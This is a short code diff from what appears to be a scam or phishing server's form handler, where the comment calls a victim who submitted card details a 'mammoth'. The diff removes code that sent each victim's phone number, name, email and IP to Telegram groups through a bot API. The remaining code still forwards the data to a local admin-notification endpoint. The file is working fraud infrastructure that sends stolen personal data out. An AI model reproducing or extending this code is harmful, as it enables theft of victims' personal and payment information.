@@ -517,14 +517,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 if not page_code and user_id:
                     page_code = get_user_id_by_page_code(user_id)
                 ip = get_real_ip(self)
-                # --- Додаємо дублювання повідомлення у всі групи ---
-                msg = f"Мамонт ввёл карту\nphone_number: {phone}\nfull_name: {name}\nemail: {mail}\nIP: {ip}\nPage: {page_code}"
-                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                for chat_id in [GROUP_ID, PAYMENT_GROUP_ID, ADMIN_ID]:
-                    try:
-                        requests.post(url, data={"chat_id": chat_id, "text": msg}, timeout=2)
-                    except Exception as e:
-                        print(f"[submit_form] Error sending to {chat_id}: {e}")
                 # Надсилаємо у main.py
                 try:
                     requests.post('http://localhost:8081/notify_admin', json={
